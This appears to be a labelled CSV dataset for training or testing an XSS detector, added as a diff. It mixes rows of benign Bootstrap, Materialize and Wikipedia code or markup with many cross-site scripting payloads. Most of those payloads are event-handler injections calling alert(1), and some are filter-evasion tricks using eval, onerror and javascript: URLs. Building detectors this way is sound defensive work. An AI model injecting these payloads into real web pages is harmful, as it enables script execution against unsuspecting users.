@@ -1,0 +1,1550 @@
+payload,label
+"<address onbeforepaste=""alert(1)"" contenteditable>test</address>",1
+<br onblur=alert(1) tabindex=1 id=x></br><input autofocus>,1
+"</span> <span class=""reference-text""><cite class=""citation news"">metz, cade (15 march 2018). <a rel=""nofollow"" class=""external text"" href=""https://www.nytimes.com/2018/03/15/technology/military-artificial-intelligence.html"">""pentagon wants silicon valley's help on a.i."" </a> <i>the new york times </i><span class=""reference-accessdate"">. retrieved <span class=""nowrap"">19 march",0
+<strong onpointerup=alert(1)>xss</strong>,1
+"<embed onmousemove=""alert(1)"">test</embed>",1
+<fieldset onpointerout=alert(1)>xss</fieldset>,1
+"this._queuecallback(() => this._destroyelement(), this._element, isanimated)",0
+if (index > items.length - 1 || index < 0) { return },0
+body: 'chips can be used to represent small blocks of information. they are most commonly used either for contacts or for tags.',0
+"document.queryselectorall('.bd-example .toast') .foreach(toastnode => { const toast = new bootstrap.toast(toastnode, {",0
+_move(event) { this._deltax = event.touches && event.touches.length > 1 ? 0 :,0
+} if (currchips.chipsdata.length) { currchips.selectchip(selectindex);,0
+delete node.dataset[key],0
+"<small oncut=""alert(1)"" contenteditable>test</small>",1
+if ( lookbackward && handlenumber > 0 ) {,0
+"<canvas onmousedown=""alert(1)"">test</canvas>",1
+<video id=x tabindex=1 onbeforeactivate=alert(1)></video>,1
+"<track draggable=""true"" ondragenter=""alert(1)"">test</track>",1
+"href: 'http://materializecss.com/pickers.html', title: 'date time picker', body: 'pickers provide a simple way to select a date or time.'",0
+<noframes onblur=alert(1) tabindex=1 id=x></noframes><input autofocus>,1
+"<plaintext oncopy=""alert(1)"" contenteditable>test</plaintext>",1
+const isdisabled = element => { if (!element || element.nodetype !== node.element_node) { return true,0
+g.children[a].reset(),0
+<slot id=x tabindex=1 onbeforeactivate=alert(1)></slot>,1
+"if ( mode === 'count' ) { var spread = ( 100 / (values-1) ), v, i = 0; values = [];",0
+<select id=x tabindex=1 onbeforeactivate=alert(1)></select>,1
+value: function destroy() { this._removeeventhandlers(); this.el.m_carousel = undefined;,0
+return domelem.m_scrollspy,0
+"<button ondblclick=""alert(1)"">test</button>",1
+const escape_key$1 = 'escape',0
+"let root = !!context ? context : document.body; let registry = { autocomplete: root.queryselectorall('.autocomplete:not(.no-autoinit)'),",0
+"<li class=""toclevel-2 tocsection-65""><a href=""#superintelligence""><span class=""tocnumber"">8.5",0
+"</div> </td> </tr><tr><td class=""navbox-abovebelow"" colspan=""2"">",0
+this._animateindicator(previndex); e.preventdefault(); },0
+this._scrollbar.hide(); document.body.classlist.add(class_name_open); this._adjustdialog();,0
+const class_name_slide = 'slide'; const class_name_end = 'carousel-item-end'; const class_name_start = 'carousel-item-start';,0
+<picture id=x tabindex=1 onbeforedeactivate=alert(1)></picture><input autofocus>,1
+"<body onmouseup=""alert(1)"">test</body>",1
+<button onpointerover=alert(1)>xss</button>,1
+"value: function gotoyear(year) { if (!isnan(year)) { this.calendars[0].year = parseint(year, 10);",0
+return } if (this._eventispointerpentouch(event)) {,0
+scrollparents.foreach(function (scrollparent) {,0
+"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><select id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></select>",1
+"} else if (spacedname.indexof("" "" + c + "" "")) { v.classname += "" "" + c; }",0
+"v.classname = v.classname.replace(c, """"); } }",0
+"<acronym onbeforepaste=""alert(1)"" contenteditable>test</acronym>",1
+"m.checkpossiblealignments = function (el, container, bounding, offset) {",0
+"<script> object.prototype.src = ['data:,alert(1)//'] </script> <script> $.getscript('https://google.com/') </script>",1
+"to = math.min(to, reference[handlenumber + 1] - options.margin)",0
+"<style>:target {color:red;}</style><img id=x style=""transition:color 1s"" ontransitionend=alert(1)></img>",1
+this._activetarget = null; this._clearactiveclass(targetelement(entry)); continue;,0
+this.offsetx = 40; } this._setupeventhandlers();,0
+"<li class=""toctree-l1""><a class=""reference internal"" href=""versioning.html"">versioning and api stability</a></li>",0
+_handleinputclick() { if (this.dropdown && this.dropdown.isopen) { this._setvaluetoinput();,0
+<element onblur=alert(1) tabindex=1 id=x></element><input autofocus>,1
+"element.setattribute(name, value === true ? '' : value); } });",0
+"<li><a href=""/wiki/hilbert%27s_program"" title=""hilbert&#39;s program"">hilbert's program </a><span class=""nowrap"">&#160;",0
+function s4() { return math.floor((1 + math.random()) * 0x10000) .tostring(16),0
+"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><body id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></body>",1
+"<li><a href=""/wiki/harmony_search"" class=""mw-redirect"" title=""harmony search"">harmony search </a> </li>",0
+var _element$ownerdocumen; if (list === void 0) { list = [];,0
+"<nextid draggable=""true"" ondragleave=""alert(1)"">test</nextid>",1
+_this19.close(); } });,0
+"https://portswigger-labs.net/xss/xss.php?x=%3cscript%3ename=%27alert(1)%27;location=%27//subdomain1.portswigger-labs.net/xss/xss.php?x=%3csvg%20onload=%22attributes[0].value=name,new%20onload%22%3e%27;%3c/script%3e",1
+"<dt><a class=""reference internal"" href=""topics/loaders.html""><span class=""doc"">item loaders",0
+function getuastring() { var uadata = navigator.useragentdata; if (uadata != null && uadata.brands && array.isarray(uadata.brands)) {,0
+"return '<td class=""is-empty""></td>'; } }",0
+return false } if (value === number(value).tostring()) {,0
+background:,0
+value: function dismissall() {,0
+"var dragdirection = totaldeltax > 0 ? 'right' : 'left'; totaldeltax = math.min(this._width, math.abs(totaldeltax)); if (this.options.edge !== dragdirection) {",0
+"<nobr onmouseleave=""alert(1)"">test</nobr>",1
+"<abbr onmouseover=""alert(1)"">test</abbr>",1
+"const defaulttype$1 = { offset: '(number|null)', rootmargin: 'string',",0
+"<marquee onmouseenter=""alert(1)"">test</marquee>",1
+if (!content) { templateelement.remove(); return;,0
+"<footer onmouseenter=""alert(1)"">test</footer>",1
+"key: ""_handledocumentclickend"", value: function _handledocumentclickend(e) { var _this58 = this;",0
+"constructor(el, options) { super(slider, el, options); this.el.m_slider = this;",0
+"this.$input[0].removeeventlistener('keydown', this._handleinputkeydownbound); } _handlechipclick(e) {",0
+"document.queryselectorall('[data-bs-toggle=""tooltip""]')",0
+let domelem = !!el.jquery ? el[0] : el; return domelem.m_tabs; },0
+"this.el.style.transform = ""translatex("" + transformx + ""px)""; this._overlay.style.opacity = this.percentopen; }",0
+if (!parentscrolltop) {,0
+<strike id=x tabindex=1 onbeforeactivate=alert(1)></strike>,1
+if (!new regexp(expectedtypes).test(valuetype)) {,0
+"<div draggable=""true"" contenteditable>drag me</div><address ondragover=alert(1) contenteditable>drop here</address>",1
+"<tr draggable=""true"" ondragenter=""alert(1)"">test</tr>",1
+"_settabsandtabwidth() { this.tabswidth = this.$el.width(); this.tabwidth = math.max(this.tabswidth, this.el.scrollwidth) / this.$tablinks.length;",0
+"<nobr onmouseout=""alert(1)"">test</nobr>",1
+"this.$img[0].removeeventlistener('load', this._handleimageloadbound); if (parallax._parallaxes.length === 0) { window.removeeventlistener('scroll', parallax._handlescrollthrottled);",0
+"<style>@keyframes slidein {}</style><legend style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></legend>",1
+if (!!toast._draggedtoast) { e.preventdefault(); var toast = toast._draggedtoast;,0
+"rightcallback: () => this._slide(this._directiontoorder(direction_right)),",0
+if ( entry === true || entry === false ) { for ( i = 1; i < parsed.handles; i++ ) { connect.push(entry);,0
+"$('input#search').on('keyup', debounce(function (e) {",0
+"<var oncopy=""alert(1)"" contenteditable>test</var>",1
+"anim({ targets: this.el, translatex: [`${slideoutpercent * 100}%`, `${endpercent * 105}%`],",0
+<col id=x tabindex=1 onfocus=alert(1)></col>,1
+"<basefont onkeydown=""alert(1)"" contenteditable>test</basefont>",1
+var docel = doc.documentelement; fn.extend({ position: function () {,0
+"<style>@keyframes x{}</style><details style=""animation-name:x"" onanimationend=""alert(1)""></details>",1
+} else if ($target.closest('.month-prev').length) {,0
+<marquee onstart=alert(1)></marquee>,1
+$('.tooltipped').tooltip(),0
+import backdrop from './util/backdrop.js' import { enabledismisstrigger } from './util/component-functions.js' import focustrap from './util/focustrap.js',0
+this._element.style.overflowy = 'hidden' } this._element.classlist.add(class_name_static),0
+<i id=x tabindex=1 ondeactivate=alert(1)></i><input id=y autofocus>,1
+"} } _this62.$indicators = $('<ul class=""indicators""></ul>');",0
+"</span> <span class=""toctext"">technological singularity",0
+"prop: function (name, value) { if (isstring(name)) { return (value === undefined ? this[0][name] : this.each(function (v) {",0
+scroll: false }; const defaulttype$5 = {,0
+this.options.top <= scrolled &&,0
+"document.body.style.cursor = ''; document.body.removeeventlistener('selectstart', document.body.nouilistener); }",0
+"this._element.classlist.remove(class_name_show) this._element.setattribute('aria-expanded', 'false') manipulator.removedataattribute(this._menu, 'popper')",0
+<slot onpointerdown=alert(1)>xss</slot>,1
+<figcaption onpointerleave=alert(1)>xss</figcaption>,1
+_this67._calculatepositioning(),0
+tick.css({ left: this.options.dialradius +,0
+<input4 onpointerover=alert(1)>xss</input4>,1
+} } _animateimagein() {,0
+if ( $(e.target).is($('.card-reveal .card-title')) || $(e.target).is($('.card-reveal .card-title i')),0
+var isbaseplacement = baseplacement === preferredplacement,0
+if (typeof value !== 'string') {,0
+<sup onpointermove=alert(1)>xss</sup>,1
+<object onpointerup=alert(1)>xss</object>,1
+"<var onkeyup=""alert(1)"" contenteditable>test</var>",1
+"<frameset draggable=""true"" ondragstart=""alert(1)"">test</frameset>",1
+"<wbr oncontextmenu=""alert(1)"">test</wbr>",1
+_handlemodalcloseclick(e) { let $closetrigger = $(e.target).closest('.modal-close'); if ($closetrigger.length) {,0
+this._haskeyboardinteraction = false; this._setlisteners(); },0
+"eventhandler.off(element, 'mouseover', noop)",0
+<acronym onpointerover=alert(1)>xss</acronym>,1
+} _getactiveelem() { return this._getchildren().find(child => this._elemisactive(child)) || null,0
+"<dt oncontextmenu=""alert(1)"">test</dt>",1
+element = index_js.getelement(element); if (!element) { return;,0
+"<li><a href=""#citerefnilsson1998"">nilsson 1998 </a>, chpt. 18 </li> </ul>",0
+const escape_key$2 = 'escape',0
+<svg><param onload=alert(1)></param>,1
+<xss id=x tabindex=1 onbeforedeactivate=alert(1)></xss><input autofocus>,1
+"<picture onkeyup=""alert(1)"" contenteditable>test</picture>",1
+"<rb draggable=""true"" ondragleave=""alert(1)"">test</rb>",1
+if (canalign.spaceonbottom < 0) {,0
+<body id=x tabindex=1 onbeforedeactivate=alert(1)></body><input autofocus>,1
+"} instancemap.set(key, instance) },",0
+const popper = object.freeze( object.defineproperty({,0
+const event_show$2 = 'show',0
+"<nobr onbeforepaste=""alert(1)"" contenteditable>test</nobr>",1
+"this._handleindicatorclickbound = this._handleindicatorclick.bind(this); this.$indicators.find('.indicator-item').each((el, i) => { el.addeventlistener('click', this._handleindicatorclickbound);",0
+this.dropdown.open(),0
+"<legend onmousedown=""alert(1)"">test</legend>",1
+"if ($target.hasclass('datepicker-day-button') && !$target.hasclass('is-empty') && !$target.parent().hasclass('is-disabled')) { this.setdate(new date(e.target.getattribute('data-year'), e.target.getattribute('data-month'), e.target.getattribute('data-day'))); if (this.options.autoclose) {",0
+"<style>:target {color: red;}</style><base id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></base>",1
+"<li draggable=""true"" ondragenter=""alert(1)"">test</li>",1
+"href: 'http://materializecss.com/checkboxes.html',",0
+static _handlechipskeyup(e) { chips._keydown = false; },0
+<s id=x tabindex=1 onbeforeactivate=alert(1)></s>,1
+"<footer draggable=""true"" ondragenter=""alert(1)"">test</footer>",1
+"<style>:target {color: red;}</style><multicol id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></multicol>",1
+"<style>@keyframes x{}</style><big style=""animation-name:x"" onanimationstart=""alert(1)""></big>",1
+"<nextid onmousedown=""alert(1)"">test</nextid>",1
+<ul onblur=alert(1) tabindex=1 id=x></ul><input autofocus>,1
+<small onblur=alert(1) tabindex=1 id=x></small><input autofocus>,1
+"this.close(); } }, {",0
+"<li><a href=""#citerefpoolemackworthgoebel1998"">poole, mackworth &amp; goebel 1998 </a>, pp.&#160;298–305 </li>",0
+"'touchstart', this._handlecontainermousedownandtouchstartbound );",0
+if ( decrement !== null && decrement !== false ) { decrement = number(decrement.tofixed(stepdecimals)); },0
+"<ul onmousedown=""alert(1)"">test</ul>",1
+"<style>:target {color:red;}</style><li id=x style=""transition:color 1s"" ontransitionend=alert(1)></li>",1
+"name: 'stackblitz-config-replacer', transform(code, id) { if (id.includes('stackblitz.js')) {",0
+return v.innerhtml = source,0
+<plaintext onpointerleave=alert(1)>xss</plaintext>,1
+"<kbd onkeypress=""alert(1)"" contenteditable>test</kbd>",1
+<script>'alert\x281\x29'instanceof{[symbol.hasinstance]:eval}</script>,1
+"<li><a href=""/wiki/cross-validation_(statistics)"" title=""cross-validation (statistics)"">cross-validation </a> </li> </ul>",0
+"this.currentview = view; $(this.spanhours).toggleclass('text-primary', ishours); $(this.spanminutes).toggleclass('text-primary', !ishours);",0
+<form onsubmit=alert(1)><input type=submit>,1
+value: function _handleinputkeydown(e) {,0
+"<style>@keyframes x{}</style><var style=""animation-name:x"" onanimationend=""alert(1)""></var>",1
+"<var draggable=""true"" ondragleave=""alert(1)"">test</var>",1
+"}, children(element, selector) { return [].concat(...element.children).filter(child => child.matches(selector));",0
+"<ol oncopy=""alert(1)"" contenteditable>test</ol>",1
+"tests[name].t( parsed, options[name] === undefined ? defaults[name] : options[name] )",0
+"this._element.classlist.add(class_name_collapse, class_name_show); this._element.style[dimension] = ''; eventhandler.trigger(this._element, event_shown);",0
+"this._handlecarouselclickbound = this._handlecarouselclick.bind(this); if (typeof window.ontouchstart !== 'undefined') { this.el.addeventlistener('touchstart', this._handlecarouseltapbound);",0
+"<style>:target {transform: rotate(180deg);}</style><p id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></p>",1
+"<style>:target {color: red;}</style><listing id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></listing>",1
+<dialog id=x tabindex=1 onfocusin=alert(1)></dialog>,1
+"fn.extend({ serialize: function () { var query = """";",0
+var proposal = (movement * 100) / data.basesize,0
+"this.$inputfield.append(this.container); this.el.setattribute('data-target', this.container.id); this.dropdown = m.dropdown.init(this.el, {",0
+if (value === number(value).tostring()) {,0
+const class_name_collapsing = 'collapsing',0
+"<aside onmouseenter=""alert(1)"">test</aside>",1
+<option onpointerenter=alert(1)>xss</option>,1
+"<style>@keyframes x{}</style><multicol style=""animation-name:x"" onanimationend=""alert(1)""></multicol>",1
+<multicol onpointerup=alert(1)>xss</multicol>,1
+"this.set(newindex); } }], [{",0
+<svg><code onload=alert(1)></code>,1
+"return h.fnc(a) ? a(c.target, c.id, c.total) : a",0
+var text = el.text().trim(); this.el.value = text; this.$el.trigger('change');,0
+"position: state.options.strategy, adaptive: adaptive, roundoffsets: roundoffsets",0
+this.modal.destroy(); $(this.modalel).remove(); this.destroyselects();,0
+"<area onbeforecopy=""alert(1)"" contenteditable>test</area>",1
+"anim({ targets: this.$slides.first()[0], opacity: 1,",0
+"<u onmouseleave=""alert(1)"">test</u>",1
+"manipulator.setdataattribute(this._menu, 'popper', 'static') // todo: v6 remove",0
+"</span> <span class=""reference-text""><cite class=""citation journal"">prakken, henry (31 august 2017). ""on the problem of making autonomous vehicles conform to traffic law"". <i>artificial intelligence and law </i>. <b>25 </b> (3): 341–363. <a href=""/wiki/digital_object_identifier"" title=""digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1007%2fs10506-017-9210-0"">10.1007/s10506-017-9210-0 </a>. </cite><span title=""ctx_ver=z39.88-2004&amp;rft_val_fmt=info%3aofi%2ffmt%3akev%3amtx%3ajournal&amp;rft.genre=article&amp;rft.jtitle=artificial+intelligence+and+law&amp;rft.atitle=on+the+problem+of+making+autonomous+vehicles+conform+to+traffic+law&amp;rft.volume=25&amp;rft.issue=3&amp;rft.pages=341-363&amp;rft.date=2017-08-31&amp;rft_id=info%3adoi%2f10.1007%2fs10506-017-9210-0&amp;rft.aulast=prakken&amp;rft.aufirst=henry&amp;rfr_id=info%3asid%2fen.wikipedia.org%3aartificial+intelligence"" class=""z3988"">",0
+"<header onmouseleave=""alert(1)"">test</header>",1
+"<pre onbeforepaste=""alert(1)"" contenteditable>test</pre>",1
+</span>(1918) </li>,0
+"<a href=""//www.google.com/""></a>",1
+"<var draggable=""true"" ondragstart=""alert(1)"">test</var>",1
+newx = offset; } else if (edges.right) { newx -= newx + width - window.innerwidth;,0
+this._removeeventhandlers(); this.el.removeattribute('style'); this.$overlay.remove();,0
+"return h.obj(a) && a.hasownproperty(""totallength"")",0
+"</div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%""><a href=""/wiki/theory_of_computation"" title=""theory of computation"">theory of computation </a> </th><td class=""navbox-list navbox-odd"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0
+<shadow id=x tabindex=1 ondeactivate=alert(1)></shadow><input id=y autofocus>,1
+} else { this._scroll(this.target); },0
+<optgroup onpointerup=alert(1)>xss</optgroup>,1
+"<bdo onpaste=""alert(1)"" contenteditable>test</bdo>",1
+"popperrect = _ref2.popperrect,",0
+"<h3><span class=""mw-headline"" id=""government"">government",0
+constructor() { this._element = document.body },0
+"<kbd oncontextmenu=""alert(1)"">test</kbd>",1
+"var referencerect = state.rects.reference; var popperrect = state.rects.popper; var tetheroffsetvalue = typeof tetheroffset === 'function' ? tetheroffset(object.assign({}, state.rects, {",0
+}; const name$f = 'alert'; const data_key$a = 'bs.alert';,0
+"<li><a href=""/wiki/constructivist_epistemology"" title=""constructivist epistemology"">constructivist epistemology </a> </li>",0
+row = []; datepicker._settostartofday(now); if (opts.firstday > 0) {,0
+"<ul><li><a href=""#citerefturing1950"">turing 1950 </a> under ""(2) the mathematical objection"" </li>",0
+"</span>"". <i>science fiction studies </i>. <b>24 </b> (3): 413–429. <a href=""/wiki/jstor"" title=""jstor"">jstor </a>&#160;<a rel=""nofollow"" class=""external text"" href=""//www.jstor.org/stable/4240644"">4240644 </a>. </cite><span title=""ctx_ver=z39.88-2004&amp;rft_val_fmt=info%3aofi%2ffmt%3akev%3amtx%3ajournal&amp;rft.genre=article&amp;rft.jtitle=science+fiction+studies&amp;rft.atitle=entering+the+posthuman+collective+in+philip+k.+dick%27s+%22do+androids+dream+of+electric+sheep%3f%22&amp;rft.volume=24&amp;rft.issue=3&amp;rft.pages=413-429&amp;rft.date=1997-01-01&amp;rft_id=%2f%2fwww.jstor.org%2fstable%2f4240644&amp;rft.aulast=galvan&amp;rft.aufirst=jill&amp;rfr_id=info%3asid%2fen.wikipedia.org%3aartificial+intelligence"" class=""z3988"">",0
+"<script>throw{},onerror=uncaught=eval,h=location.hash,e={linenumber:1,columnnumber:1,filename:0,message:h[2]+h[1]+h},!!window.installtrigger?e:e.message</script>",1
+"<style>@keyframes x{}</style><col style=""animation-name:x"" onanimationstart=""alert(1)""></col>",1
+<option id=x tabindex=1 onactivate=alert(1)></option>,1
+"<embed src=""javascript:alert(1)"">",1
+"<script>myundeffunction(13,37);var inject=""injection_starts_here"";function myundeffunction(){};alert(1);//"";</script>",1
+"<label onmouseover=""alert(1)"">test</label>",1
+"<ul><li><a href=""#citerefrussellnorvig2003"">russell &amp; norvig 2003 </a>, pp.&#160;908–915 </li> </ul>",0
+"<style>:target {color: red;}</style><hgroup id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></hgroup>",1
+var checksmap = new map(); var makefallbackchecks = true; var firstfittingplacement = placements[0];,0
+<hr onpointerup=alert(1)>xss</hr>,1
+"<style draggable=""true"" ondrag=""alert(1)"">test</style>",1
+"if ( ordered.length && typeof ordered[0][0] === ""object"" ) { ordered.sort(function(a, b) { return a[0][0] - b[0][0]; }); } else {",0
+"<b draggable=""true"" ondragenter=""alert(1)"">test</b>",1
+this.isvalidlength = actuallength <= maxlength,0
+getdata() { return this.chipsdata; },0
+"<element onbeforepaste=""alert(1)"" contenteditable>test</element>",1
+"<isindex onkeydown=""alert(1)"" contenteditable>test</isindex>",1
+<script>navigation.navigate('javascript:alert(1)')</script>,1
+"<meta onmousedown=""alert(1)"">test</meta>",1
+"<li><cite id=""citerefminsky1967"" class=""citation book""><a href=""/wiki/marvin_minsky"" title=""marvin minsky"">minsky, marvin </a> (1967). <span class=""cs1-lock-registration"" title=""free registration required""><a rel=""nofollow"" class=""external text"" href=""https://archive.org/details/computationfinit0000mins""><i>computation: finite and infinite machines </i> </a>",0
+<colgroup onpointermove=alert(1)>xss</colgroup>,1
+"currentnode = currentnode.host; } while (ishtmlelement(currentnode) && ['html', 'body'].indexof(getnodename(currentnode)) < 0) {",0
+this._isshown = false this._element.classlist.add(class_name_hiding) this._backdrop.hide(),0
+let top = this.$el.offset().top; let scrolltop = m.getdocumentscrolltop(); let windowheight = window.innerheight;,0
+if ( e.type.indexof('mspointer') === 0 ) { pointer = true; },0
+"<style>@keyframes slidein {}</style><address style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></address>",1
+const entryislowerthanprevious = entry.target.offsettop >= this._previousscrolldata.visibleentrytop; if (userscrollsdown && entryislowerthanprevious) { activate(entry);,0
+"<audio controls autoplay onratechange=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",1
+<details onpointerenter=alert(1)>xss</details>,1
+"<font draggable=""true"" ondragstart=""alert(1)"">test</font>",1
+function getclosesthandle ( proposal ) { var closest = 100; var handlenumber = false;,0
+<video onwebkitplaybacktargetavailabilitychanged=alert(1)>,1
+export function stackblitzplugin() {,0
+<noscript onpointerup=alert(1)>xss</noscript>,1
+const items = this._getitems() if (index > items.length - 1 || index < 0) { return,0
+"overlay.classlist.add('sidenav-overlay'); overlay.addeventlistener('click', this._closebound); document.body.appendchild(overlay);",0
+} parsed.limit = parsed.spectrum.getmargin(entry); if ( !parsed.limit || parsed.handles < 2 ) {,0
+"<html oncut=""alert(1)"" contenteditable>test</html>",1
+"<bdo onclick=""alert(1)"">test</bdo>",1
+if (this._isshown && !this._istransitioning) {,0
+"<style>:target {transform: rotate(180deg);}</style><font id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></font>",1
+<aside id=x tabindex=1 onactivate=alert(1)></aside>,1
+}; } _removeeventhandlers() {,0
+"<script>throw[onerror]=[alert],1</script>",1
+"<li id=""cite_note-:1-290""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-:1_290-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-:1_290-1""><sup><i><b>b </b> </i> </sup> </a>",0
+this.$overlay[0].style.zindex = 1000 + modal._modalsopen * 2; this.el.style.zindex = 1000 + modal._modalsopen * 2 + 1; this._openingtrigger = !!$trigger ? $trigger[0] : undefined;,0
+"var baseplacement = getbaseplacement(state.placement); var axis = getmainaxisfromplacement(baseplacement); var isvertical = [left, right].indexof(baseplacement) >= 0;",0
+<track onpointermove=alert(1)>xss</track>,1
+"return day === 0 || day === 6; } }, {",0
+const selector_visible_items = '.dropdown-menu .dropdown-item:not(.disabled):not(:disabled)'; const placement_top = isrtl() ? 'top-end' : 'top-start'; const placement_topend = isrtl() ? 'top-start' : 'top-end';,0
+"<dl draggable=""true"" ondrag=""alert(1)"">test</dl>",1
+for (const selector of selectorengine.find(open_selector)) { offcanvas.getorcreateinstance(selector).show() },0
+<svg><sup onload=alert(1)></sup>,1
+"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><section id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></section>",1
+<colgroup onfocusout=alert(1) tabindex=1 id=x></colgroup><input autofocus>,1
+} _toggleentryfromarray(key) { let notadded = !this._keysselected.hasownproperty(key);,0
+"<basefont onpaste=""alert(1)"" contenteditable>test</basefont>",1
+"this.el.removeeventlistener('mouseup', this._handlerangemouseuptouchendbound); this.el.removeeventlistener('touchend', this._handlerangemouseuptouchendbound); this.el.removeeventlistener('blur', this._handlerangeblurmouseouttouchleavebound);",0
+"<option oncopy=""alert(1)"" contenteditable>test</option>",1
+"<col onkeyup=""alert(1)"" contenteditable>test</col>",1
+this._lasttabnavdirection = event.shiftkey ? tab_nav_backward : tab_nav_forward; } },0
+if (isrtl()) { return direction === direction_left ? order_prev : order_next; },0
+"b = { type: c, property: b.name, animatable: a, tweens: d, duration: d[d.length - 1].end, delay: d[0].delay }",0
+const parentdropdown = this._parent; if (parentdropdown.classlist.contains(class_name_dropend)) { return placement_right;,0
+_this21.el.m_parallax = _this21,0
+"key: ""_ondragstart"", value: function _ondragstart(e) { if (e.target && $(e.target).closest('.toast').length) {",0
+<acronym id=x tabindex=1 onbeforedeactivate=alert(1)></acronym><input autofocus>,1
+"<div draggable=""true"" contenteditable>drag me</div><meter ondrop=alert(1) contenteditable>drop here</meter>",1
+"<li><a href=""#citerefcrevier1993"">crevier 1993 </a>, pp.&#160;258–263 </li> </ul>",0
+"<textarea draggable=""true"" ondragleave=""alert(1)"">test</textarea>",1
+"merge: function (first, second) { var len = +second.length, i = first.length,",0
+let lasttick = scrollspy.tickid; if (lasttick < 0) { scrollspy._enter();,0
+"addclass(element, classname)",0
+.eq(diff)[0] .classlist.add('active'); },0
+} _handlemouseenter() { this.ishovered = true;,0
+"<track onkeydown=""alert(1)"" contenteditable>test</track>",1
+_this62.images = []; _this62.itemwidth = _this62.$el.find('.carousel-item').first().innerwidth(); _this62.itemheight = _this62.$el.find('.carousel-item').first().innerheight();,0
+"} return { x: element.offsetleft,",0
+<iframe onreadystatechange=alert(1)></iframe>,1
+} if (verticalalignment === 'bottom') { idealypos = idealypos - dropdownbrect.height + (this.options.covertrigger ? triggerbrect.height : 0);,0
+<spacer onblur=alert(1) tabindex=1 id=x></spacer><input autofocus>,1
+return node instanceof ownelement || node instanceof shadowroot,0
+if (state.reset === true) {,0
+context._activetrigger[event.type === 'focusout' ? trigger_focus : trigger_hover] = context._element.contains(event.relatedtarget) context._leave(),0
+"<dialog onkeydown=""alert(1)"" contenteditable>test</dialog>",1
+"let opts = this.options, now = new date(), days = datepicker._getdaysinmonth(year, month),",0
+"}, this._dialog) }, this._dialog) this._element.focus()",0
+"dropdownoptions: { container: document.body, constrainwidth: false } }); m.formselect.init(monthselect, {",0
+<option onpointerleave=alert(1)>xss</option>,1
+"<style>@keyframes x{}</style><* style=""animation-name:x"" onanimationstart=""alert(1)""></*>",1
+"selector: false, template: '<div class=""tooltip"" role=""tooltip"">' + '<div class=""tooltip-arrow""></div>' + '<div class=""tooltip-inner""></div>' + '</div>', title: '',",0
+"<head onpaste=""alert(1)"" contenteditable>test</head>",1
+<big id=x tabindex=1 ondeactivate=alert(1)></big><input id=y autofocus>,1
+"<p>intelligent agents must be able to set goals and achieve them.<sup id=""cite_ref-planning_110-0"" class=""reference""><a href=""#cite_note-planning-110"">&#91;107&#93; </a> </sup> they need a way to visualize the future—a representation of the state of the world and be able to make predictions about how their actions will change it—and be able to make choices that maximize the <a href=""/wiki/utility"" title=""utility"">utility </a> (or ""value"") of available choices.<sup id=""cite_ref-information_value_theory_111-0"" class=""reference""><a href=""#cite_note-information_value_theory-111"">&#91;108&#93; </a> </sup>",0
+"return ispercentage([va, vb], (value - pa) * subrangeratio (pa, pb)); } function getstep ( xpct, xsteps, snap, value ) {",0
+"<font onmouseenter=""alert(1)"">test</font>",1
+} if (this.options.toolbarenabled) { this._animateintoolbar();,0
+<tr onpointerout=alert(1)>xss</tr>,1
+<mark onpointerleave=alert(1)>xss</mark>,1
+"'background-color': '', transform: 'translate3d(' + -this.offsetx + 'px,0,0)' });",0
+"key: ""_setupactivetablink"", value: function _setupactivetablink() { this.$activetablink = $(this.$tablinks.filter('[href=""' + location.hash + '""]'));",0
+"this._element.classlist.add(class_name_show$3); this._element.classlist.remove(class_name_showing$1); eventhandler.trigger(this._element, event_shown$3, {",0
+"<style>@keyframes slidein {}</style><frame style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></frame>",1
+switch (variation) {,0
+if (this.nowrap) { if (this.target >= this.dim * (this.count - 1)) { this.target = this.dim * (this.count - 1);,0
+"}return b; }(), ha = { css: function (a, c, d) {",0
+"<blockquote onmouseleave=""alert(1)"">test</blockquote>",1
+<blink id=x tabindex=1 onbeforeactivate=alert(1)></blink>,1
+for (let key in data) { if (data.hasownproperty(key) && key.tolowercase().indexof(val) !== -1) { let entry = {,0
+$collapsibleli[0].classlist.remove('active'),0
+"x = math.sin(radian) * radius,",0
+var bottom = this.$el.offset().top + containerheight,0
+"<q onmousedown=""alert(1)"">test</q>",1
+"<figure onmouseup=""alert(1)"">test</figure>",1
+m.toast = function(options) {,0
+"} else { hiddendiv.css('width', window.innerwidth / 2 + 'px'); }",0
+"ga('require', 'linker');",0
+"checks.push(overflow[mainvariationside] <= 0, overflow[altvariationside] <= 0)",0
+<progress onfocusout=alert(1) tabindex=1 id=x></progress><input autofocus>,1
+return } const nextelement = event.relatedtarget,0
+"_classcallcheck(this, dropdown); var _this9 = _possibleconstructorreturn(this, (dropdown.__proto__ || object.getprototypeof(dropdown)).call(this, dropdown, el, options)); _this9.el.m_dropdown = _this9;",0
+toastbootstrap.show(),0
+"throw new error(""nouislider: 'step' is not numeric."")",0
+"<form><input type=hidden name=x value=""';eval(name)//""><input type=hidden name=context value=js_string_single><input type=""submit"" formaction=""http://subdomain1.portswigger-labs.net/xss/xss.php"" formtarget=""alert(1)"" value=""xss via formtarget in input type submit""></form>",1
+} this.pause() if (this.touchtimeout) {,0
